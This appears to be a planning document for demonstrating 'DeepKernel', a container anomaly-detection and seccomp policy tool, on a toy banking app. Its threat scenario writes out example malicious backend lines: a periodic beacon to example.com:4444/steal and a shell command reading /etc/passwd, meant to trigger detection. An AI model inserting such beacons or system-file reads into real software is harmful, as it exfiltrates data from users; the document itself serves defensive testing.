# Bachat Bank Demo Plan

Purpose: showcase DeepKernel’s end-to-end anomaly detection, triage, and policy enforcement on a minimal “banking” app, with one malicious change (THREAT) and one legitimate change (SAFE + continuous learning).

## App Overview
- Two services (Dockerized via compose):
  - `frontend`: simple React/Express UI serving login and account summary (static data).
  - `backend`: FastAPI (Python) serving static user/account JSON and handling login/auth stub.
- Data: static JSON (no real DB) to keep footprint small.
- Containers run on same host where DeepKernel agent and server run.

## Normal Behavior (baseline)
- Frontend calls backend:
  - `GET /health`
  - `POST /login` (accepts any demo credential, returns token)
  - `GET /account` (requires token; returns static balances/transactions)
- Syscall profile: typical file reads, small network loopback to backend only.

## Malicious Change Scenario (THREAT)
- Change: backend adds a background task that exfiltrates data / opens outbound high-port connection, e.g.:
  - `async def beacon():` every 5s `httpx.get("https://example.com:4444/steal")`
  - Or `subprocess.run(["/bin/sh","-c","cat /etc/passwd"])` on `/account` request.
- Expected effect:
  - New syscalls: `connect` to INTERNET_HIGH_PORT, possible `execve`/`openat` to `/etc/passwd`.
  - DeepKernel scoring flags window as anomalous, triage returns THREAT, policy engine generates seccomp deny-connect-high-ports, agent enforcement invoked, WS/UI shows POLICY_APPLIED.

## Safe Change Scenario (SAFE + learn)
- Change: backend adds legitimate outbound call to an internal payments service:
  - `httpx.post("http://payments-internal:8080/reconcile", ...)`
- Syscall delta: `connect` to LAN:8080 (internal), slight file I/O.
- DeepKernel: initial window may flag; triage uses change-context (stubbed diff summary: “new internal payments call to port 8080”) → verdict SAFE; triggers long dump + retrain; model status updates to READY; subsequent windows not anomalous.

## Demo Flow (talk track)
1) Baseline: start agent + server + UI + compose app; show normal UI status (SAFE/unknown).
2) Deploy malicious version (vuln tag):
   - CI/CD (simulated) restarts backend container with beacon code.
   - Agent sends windows → server scores → triage THREAT → policy generated/applied.
   - UI: live events show WINDOW_SCORED (anomalous), TRIAGE_RESULT THREAT, POLICY_APPLIED; container detail shows threat verdict and policy status.
3) Deploy safe version:
   - CI/CD (simulated) restarts backend with internal payments call.
   - First windows flagged but triage marks SAFE (diff summary explains port 8080).
   - Server triggers long dump + retrain; model version increments; UI shows SAFE and model update.

## Code/Config Layout (to be implemented)
```
demo-apps/bachat-bank/
  docker-compose.yml        # frontend + backend
  frontend/                 # React/Express bundle
  backend/                  # FastAPI app with toggleable behaviors
  versions/
    backend-safe/           # internal payments call
    backend-malicious/      # exfil beacon or /etc/passwd exec
```

### Backend toggles
- Use env `MODE=normal|malicious|safe` to switch behavior at runtime (CI/CD switches env + redeploy).
- Malicious: enable beacon or exec on request.
- Safe: enable internal payments call.

### DeepKernel integration points
- Agent config: monitor compose namespace (e.g., `includeNamespaceRegex: "bachat"`), watch `demo-frontend`, `demo-backend`.
- Server triage stub: accept injected change-context (diff summary from CI/CD hook) to drive SAFE verdict in safe scenario.
- Policy: ensure seccomp policy denies `connect` to ports >=1024 for THREAT case.

## How to Run (demo host)
1) Start DeepKernel server + UI + (optional) ML service on host.
2) Run agent on host with config pointing to server and monitoring bachat-bank namespace/containers.
3) Launch app:
   - `cd demo-apps/bachat-bank`
   - `docker-compose up -d` (default MODE=normal).
4) Show baseline UI (SAFE/unknown).
5) Switch to malicious:
   - `docker-compose restart backend` with `MODE=malicious` (or env override + up).
6) Observe DeepKernel events/policy enforcement in UI.
7) Switch to safe:
   - `docker-compose restart backend` with `MODE=safe`.
8) Observe SAFE verdict + model retrain event.

## Future Enhancements (optional)
- Add GitHub webhook simulation to push “diff summary” into triage.
- Add networkpolicy generator alongside seccomp.
- Add small SQLite state to show file I/O changes.

